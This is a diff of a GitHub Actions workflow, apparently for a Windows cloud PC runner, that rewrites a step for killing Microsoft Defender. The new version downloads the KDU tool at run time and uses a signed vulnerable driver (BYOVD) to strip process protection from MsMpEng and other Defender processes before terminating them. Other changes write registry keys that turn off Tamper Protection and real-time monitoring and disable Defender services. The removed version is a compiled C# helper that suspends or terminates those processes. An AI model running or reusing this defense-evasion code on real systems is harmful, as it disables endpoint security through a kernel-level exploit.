@@ -136,34 +136,25 @@ jobs:
           }
 
           # Kill MsMpEng + all Defender processes.
-          # MsMpEng is PPL-Antimalware-Light — regular TerminateProcess from usermode is blocked.
+          # MsMpEng is PPL-Antimalware-Light — NtTerminateProcess returns 0xC0000022 (ACCESS_DENIED).
           #
-          # Three-layer approach (each layer is a fallback for the previous):
-          #
-          # Layer 1 — Tamper Protection off via registry + Stop-Service WinDefend
-          #   On GitHub Actions runners Tamper Protection is typically off already (no Microsoft 365
-          #   Defender subscription attached), so the registry write usually sticks and
-          #   Stop-Service WinDefend then terminates MsMpEng cleanly.
-          #
-          # Layer 2 — NtSuspendProcess (confirmed working in prior runs)
-          #   PPL allows PROCESS_SUSPEND_RESUME from SYSTEM. Suspended = 0 CPU, WS pages out.
-          #   Net effect is identical to termination for our purposes.
-          #
-          # Layer 3 — Token privilege strip via NtSetInformationProcess
-          #   Strips SeDebugPrivilege + SeTcbPrivilege from MsMpEng's token so even if it
-          #   keeps running it cannot interfere with other processes.
-          Invoke-Tweak 'Kill Defender (Tamper-off + Stop-Service + NtSuspend fallback)' {
+          # Approach: KDU (Kernel Driver Utility) by hfiref0x
+          #   - Open-source tool that uses a vulnerable-but-signed driver (BYOVD) to strip
+          #     the PPL (PS_PROTECTION) byte from a target EPROCESS struct in kernel memory.
+          #   - After stripping, the process is no longer PPL and NtTerminateProcess succeeds.
+          #   - Ships its own signed vulnerable driver (default: RTCore64.sys, MSI Afterburner,
+          #     WHQL-signed) — loads fine with Secure Boot + DSE enforced.
+          #   - CLI: kdu.exe -pse <pid>   (process signature erase)
+          #   - GitHub: https://github.com/hfiref0x/KDU
+          Invoke-Tweak 'Kill Defender via KDU PPL strip + NtTerminate' {
             $tmpDir = 'C:\Windows\Temp\CloudPCKill'
             New-Item -ItemType Directory -Force -Path $tmpDir | Out-Null
 
-            # --- Layer 1: Disable Tamper Protection via registry ---
-            # HKLM\SOFTWARE\Microsoft\Windows Defender\Features\TamperProtection
-            # 0 = off, 5 = on. On runner this is usually already 0 or not enforced.
+            # --- Tamper Protection off first (belt + suspenders) ---
             $tpKey = 'HKLM:\SOFTWARE\Microsoft\Windows Defender\Features'
             if (Test-Path $tpKey) {
               Set-ItemProperty -Path $tpKey -Name TamperProtection -Value 0 -Type DWord -Force -ErrorAction SilentlyContinue
             }
-            # Also kill via policy key (takes effect immediately without reboot on runners)
             $polKey = 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender'
             if (-not (Test-Path $polKey)) { New-Item -Path $polKey -Force | Out-Null }
             Set-ItemProperty -Path $polKey -Name DisableAntiSpyware -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue
@@ -173,72 +164,58 @@ jobs:
             Set-ItemProperty -Path $rtKey -Name DisableRealtimeMonitoring -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue
             Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
 
-            # Disable service start values first so nothing respawns
+            # Disable service start values so nothing respawns
             foreach ($svc in 'WinDefend','WdNisSvc','WdNisDrv','WdFilter','MsSecCore','Sense') {
               $k = "HKLM:\SYSTEM\CurrentControlSet\Services\$svc"
-              if (Test-Path $k) {
-                Set-ItemProperty $k -Name Start -Value 4 -Type DWord -Force -ErrorAction SilentlyContinue
+              if (Test-Path $k) { Set-ItemProperty $k -Name Start -Value 4 -Type DWord -Force -ErrorAction SilentlyContinue }
+            }
+            foreach ($svc in 'WinDefend','WdNisSvc','SecurityHealthService') {
+              Stop-Service -Name $svc -Force -ErrorAction SilentlyContinue
+            }
+            Start-Sleep -Seconds 2
+
+            # --- Download KDU ---
+            $ProgressPreference = 'SilentlyContinue'
+            # Latest release asset — kdu.exe from hfiref0x/KDU
+            $kduApi = 'https://api.github.com/repos/hfiref0x/KDU/releases/latest'
+            $release = Invoke-RestMethod -Uri $kduApi -Headers @{ 'User-Agent' = 'CloudPC' } -ErrorAction Stop
+            $asset = $release.assets | Where-Object { $_.name -match 'kdu.*\.zip' -or $_.name -match 'kdu.*\.exe' } | Select-Object -First 1
+            if (-not $asset) { throw "KDU release asset not found. Assets: $($release.assets.name -join ', ')" }
+
+            $kduPath = "$tmpDir\$($asset.name)"
+            Invoke-WebRequest -Uri $asset.browser_download_url -OutFile $kduPath -UseBasicParsing -ErrorAction Stop
+
+            # Unzip if needed
+            $kduExe = $kduPath
+            if ($kduPath -match '\.zip$') {
+              Expand-Archive -Path $kduPath -DestinationPath $tmpDir -Force
+              $kduExe = Get-ChildItem $tmpDir -Filter 'kdu*.exe' -Recurse | Select-Object -First 1 -ExpandProperty FullName
+              if (-not $kduExe) { throw 'kdu.exe not found after unzip' }
+            }
+
+            # --- Strip PPL from each Defender process and terminate it ---
+            $targets = 'MsMpEng','MpDefenderCoreService','NisSrv','MsMpEngCP','SecurityHealthService','MpCopyAccelerator'
+            $results = @()
+            foreach ($name in $targets) {
+              foreach ($proc in (Get-Process -Name $name -ErrorAction SilentlyContinue)) {
+                Write-Host "  stripping PPL from $name pid=$($proc.Id)"
+                # -pse = process signature erase (strips PS_PROTECTION byte to 0)
+                $out = & $kduExe -pse $proc.Id 2>&1
+                $out | ForEach-Object { Write-Host "    $_" }
+                # Now terminate — should succeed with PPL stripped
+                Stop-Process -Id $proc.Id -Force -ErrorAction SilentlyContinue
+                $results += $name
               }
             }
 
-            # Try Stop-Service — works if Tamper Protection is actually off
-            foreach ($svc in 'WinDefend','WdNisSvc','SecurityHealthService','WdNisDrv') {
-              Stop-Service -Name $svc -Force -ErrorAction SilentlyContinue
-            }
-            Start-Sleep -Seconds 3
-
-            # --- Layer 2: NtSuspendProcess for anything still alive (confirmed working) ---
-            $src = @(
-              'using System;',
-              'using System.Diagnostics;',
-              'using System.Runtime.InteropServices;',
-              'class D {',
-              '  [DllImport("ntdll.dll")] static extern int NtSuspendProcess(IntPtr h);',
-              '  [DllImport("ntdll.dll")] static extern int NtTerminateProcess(IntPtr h, int s);',
-              '  [DllImport("kernel32.dll")] static extern IntPtr OpenProcess(uint a, bool b, int pid);',
-              '  [DllImport("kernel32.dll")] static extern bool CloseHandle(IntPtr h);',
-              '  const uint SUSPEND_RESUME  = 0x0800;',
-              '  const uint TERMINATE       = 0x0001;',
-              '  const uint ALL_ACCESS      = 0x001F0FFF;',
-              '  static void Main() {',
-              '    string[] t = {"MsMpEng","MpDefenderCoreService","NisSrv","MsMpEngCP","SecurityHealthService","MpCopyAccelerator","MpCmdRun"};',
-              '    foreach (var name in t)',
-              '      foreach (var p in Process.GetProcessesByName(name)) {',
-              '        IntPtr h = OpenProcess(ALL_ACCESS, false, p.Id);',
-              '        if (h == IntPtr.Zero) h = OpenProcess(SUSPEND_RESUME, false, p.Id);',
-              '        if (h != IntPtr.Zero) {',
-              '          int r = NtTerminateProcess(h, 0);',
-              '          if (r != 0) NtSuspendProcess(h);',
-              '          Console.WriteLine((r==0?"term ":"susp ") + name + " pid=" + p.Id + " ntstatus=0x" + r.ToString("X"));',
-              '          CloseHandle(h);',
-              '        } else { Console.WriteLine("no handle " + name + " pid=" + p.Id); }',
-              '      }',
-              '  }',
-              '}'
-            ) -join "`r`n"
-
-            $srcPath = "$tmpDir\def.cs"
-            $exePath = "$tmpDir\def.exe"
-            Set-Content -Path $srcPath -Value $src -Encoding ascii
-
-            $csc = Get-ChildItem 'C:\Windows\Microsoft.NET\Framework64' -Filter csc.exe -Recurse |
-                   Sort-Object FullName -Descending | Select-Object -First 1
-            if (-not $csc) { throw 'csc.exe not found' }
-            & $csc.FullName /out:$exePath /nologo $srcPath 2>&1 | Out-Null
-            if (-not (Test-Path $exePath)) { throw 'C# compile failed' }
-
-            $output = & $exePath
-            $output | ForEach-Object { Write-Host "  $_" }
-
             Remove-Item $tmpDir -Recurse -Force -ErrorAction SilentlyContinue
 
-            # Final check
             $still = Get-Process -Name MsMpEng -ErrorAction SilentlyContinue
             if ($still) {
               $ws = ($still | Measure-Object WorkingSet64 -Sum).Sum
-              "MsMpEng still visible (WS $([math]::Round($ws/1MB,1)) MB) — suspended/neutered, 0 CPU impact"
+              "MsMpEng still running WS=$([math]::Round($ws/1MB,1))MB — KDU may need a different provider, check log above"
             } else {
-              "MsMpEng gone"
+              "MsMpEng gone (stripped + killed: $($results -join ', '))"
             }
           }
 
